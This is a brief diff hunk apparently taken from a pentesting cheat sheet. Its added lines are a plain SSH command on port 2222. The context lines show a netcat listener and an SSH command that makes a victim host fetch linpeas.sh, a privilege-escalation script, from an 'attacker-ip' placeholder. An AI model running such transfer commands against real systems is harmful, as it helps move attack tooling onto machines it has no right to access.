@@ -36,3 +36,7 @@ nc -nlvp port
 ssh username@victim-ip "nc attacker-ip port > linpeas.sh"
 ```
 
+```
+ssh username@ip -p2222
+```
+
